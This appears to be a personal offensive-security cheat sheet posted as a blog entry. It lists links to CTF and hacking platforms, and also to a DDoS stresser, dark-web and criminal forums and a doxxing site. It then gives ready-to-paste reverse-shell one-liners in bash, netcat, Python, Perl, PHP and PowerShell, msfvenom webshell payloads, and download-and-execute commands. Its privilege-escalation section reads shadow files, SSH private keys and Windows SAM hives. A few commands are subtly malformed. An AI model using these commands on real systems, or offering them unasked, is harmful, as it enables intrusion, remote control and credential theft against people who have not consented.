---
title: Not
date: 2024-03-02 17:59:32 
categories: [CheatSheet]
tags: [kendimenotlar] 
image: https://i.kym-cdn.com/entries/icons/original/000/021/807/ig9OoyenpxqdCQyABmOQBZDI0duHk2QZZmWg2Hxd4ro.jpg
---


## Link

### CTF

- [TryHackMe](https://tryhackme.com)
- [HackTheBox](https://www.hackthebox.com/)
- [PentesterLab](https://pentesterlab.com/)
- [VulnHub](https://www.vulnhub.com/)
- [HackerOneCTF](https://ctf.hacker101.com/)
- [HackThisSite](https://www.hackthissite.org/)
- [PicoCTF](https://picoctf.org/)
- [RootMe](https://www.root-me.org/)
- [OverTheWire](https://overthewire.org/wargames/)
- [CyberExam](https://cyberexam.io/)
- [Hackviser](https://app.hackviser.com/)

### Bug Bounty

- [HackerOne](https://www.hackerone.com/)
- [BugCrowd](https://www.bugcrowd.com/)
- [BugBounter](https://bugbounter.com/)


---

- [AperiSolve](https://aperisolve.com/)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [DCode](https://www.dcode.fr/en)
- [Hexed.it](https://hexed.it/)
- [Crackstation](https://crackstation.net/)
- [Hashes](https://hashes.com/en/decrypt/hash)
- [Cryptii](https://cryptii.com/)
- [Any.run](https://any.run/)
- [Shodan](https://www.shodan.io/)
- [HaveIBeenPwned?](https://haveibeenpwned.com/)
- [Stresser.su](https://stresser.su/)
- [Jwt.io](https://jwt.io/)
- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [DynamiteLab](https://lab.dynamite.ai/)
- [Exploit-DB](https://www.exploit-db.com/)
- [MitreAttack](https://attack.mitre.org/)


### Forum

#### Dark Web Forum

- [BreachForums](https://breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd.onion/)
- [Darknet Live](https://darkzzx4avcsuofgfez5zq75cqc4mprjvfqywo45dfcaxrwqg6qrlfid.onion/)
- [Dread](https://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/)


#### Clearnet Forum

- [Exe.is](https://exe.is/)
- [Xss.is](https://xss.is/)
- [Leakbase.io](https://leakbase.io/)
- [Exploit.in](https://exploit.in/)
- [BlackHatWorld](https://www.blackhatworld.com/)
- [Cracked.io](https://cracked.io/)
- [Nulled.io](https://www.nulled.to/)
- [4Cheat](https://4cheat.ru/)
- [Doxbin](https://doxbin.org)
- [Vx-Underground](https://vx-underground.org/)
- [Spyhackerz](https://spyhackerz.net/)
- [Ramp4u](https://ramp4u.io/)
- [HackForums](https://hackforums.net/index.php)
- [CrimeNetwork](https://crime.to/)
- [BlackForums](https://blackforums.net/)


---



## Reverse Shell

### 31

````
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1  

mknod backpipe p && nc 10.10.10.1 4445 0<backpipe | /bin/bash 1>backpipe 

mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i |nc 10.10.10.1 4444 >/tmp/f2 

nc -e /bin/bash 10.10.10.1 4444

php -r '$sock=fsockopen("10.10.16.1",4446);exec("/bin/sh -i <&3 >&3 2>&3");' 

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 

perl -e 'use Socket;$i="10.10.10.1";$p=4446;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 

ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
````

### WebShells 

````
PHP 
/usr/share/webshells/php/simple-backdoor.php , paramter - cmd 

Cold FUsion 
/usr/share/webshells/cfm/cfexec.cfm

JSP 
/usr/share/webshells/jsp/jsp-reverse.jsp

ASP/ASPX
/usr/share/webshells/asp/
/usr/share/webshells/aspx/

Perl/CGI 
/usr/share/webshells/perl/perl-reverse-shell.pl
/usr/share/webshells/perl/perlcmd.cgi
````


### INITIAL ENTRY

````
JSP / tomcat WAR 
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f war > java4444.war  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.1 LPORT=4448 -f raw > w4448.jsp 

ASP /ASPX 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f asp > shell.asp
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f aspx > shell.aspx

PHP 
<?php $cmd = shell_exec('bash -i >& /dev/tcp/10.10.10.14444 0>&1'); echo $cmd;?> 
<?php $cmd = shell_exec('cmd /c \\10.10.10.1\test\nc.exe -e cmd.exe 10.10.10.1 4444'); echo $cmd;?> 
````


### Windows Reverse Shell

````

\\192.168.119.155\test\nc.exe -e cmd.exe 192.168.1.1 4444

certutil -urlcache -f http://192.168.1.1/nc.exe nc.exe & nc.exe -e cmd.exe 192.168.1.1 4444

start /B \\192.168.1.1\test\nc.exe -e cmd.exe 192.168.1.1 4444 

start /B powershell.exe -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.9.51.179',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

start /B powershell -exec bypass -c "$sm=(New-Object Net.Sockets.TCPClient('10.9.51.179',4444)).GetStream();[byte[]]$bt=0..255|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"

powershell -exec bypass -c "iwr('http://192.168.1.1Invoke-PowerShellTcp.ps1')|iex"

powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-PowerShellTcp.ps1')"

NOT Tested 
powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='192.168.xxx.xxx';$port=xxxx;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}" 

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.XXX.XXX/powercat.ps1');powercat -c 192.168.XXX.XXX -p 443 -e cmd"
````



# Privilege Escalation


## Linux PrivEsc


### Linux - Automated Scripts 

````
linPEAS.sh
LinEnum.sh
linuxprivchecker.py
unix-privesc-check
metasploit: multi/recon/local_exploit_suggester
````

### Interactive Shell 

````
python -c 'import pty;pty.spawn("/bin/bash");'  
ctrl z  
echo $TERM  
stty -a  
stty raw -echo  
fg  

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
export TERM=xterm256-color  
export SHELL=bash  

stty rows \<> colums \<> 
````

### Application Config Files 

````
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
````

### Cronjobs

````
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
ls -al /var/cron.log - check timestamps 
````

### Linux - Network

````
N
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
ip a 
ip addr

cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
````

### SUID Files

````

find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.  
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.  
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.  

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search  
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker  

-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  

find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
````

### İnfo

````
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l

## Check for Sensitive info 
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
ls -ahlR /root/
ls -ahlR /home/

cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg

cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history

## SSH KEYS
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
````


## Windows PrivEsc


### Windows - Automated Tools

````
Run winpeas 
Run PowerUp.ps1
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/PowerUp.ps1');Invoke-AllChecks"

Run Sherlock.ps1
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/Sherlock.ps1');Find-AllVulns"

accesschk.exe /accepteula -wvu
Folder Perms 
\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\
\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\
File Perms 
\\192.168.119.155\test\accesschk.exe /accepteula -uwqs  "Authenticated Users" C:\*.*
\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\*.*

Run JAWS

# Executables  
WinPEAS.exe /.bat * 
Seatbelt.exe 
Watson.exe * 
Sharpup.exe 
windows-privesc-check2.exe --dump -G

#Powershell 
Sherlock.ps1 * 
PowerUp.ps1 * 
jaws-enumps1 * 


#Other 
Windows-exploit-suggester.py *
Systeminfo -> a text file and run it with windows exploit suggester.py, search for exploit in SecWiki github 

MSF exploit suggester *
In a meterpreter session – run /post/multi/recon/local_exploit_suggester - > shows list of kernel
````

### Win-Network

````
ipconfig /all  
route print  
arp -A  
````

### SAM Files

````
%SYSTEMROOT%\repair\SAM  
%SYSTEMROOT%\System32\config\RegBack\SAM  
%SYSTEMROOT%\System32\config\SAM  
%SYSTEMROOT%\repair\system  
%SYSTEMROOT%\System32\config\SYSTEM  
%SYSTEMROOT%\System32\config\RegBack\system  

findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
Findstr /si password *.config 
findstr /si pass/pwd *.ini  

dir /s *pass* == *cred* == *vnc* == *.config*  

in all files  
findstr /spin "password" *.*  
findstr /spin "password" *.*  
````

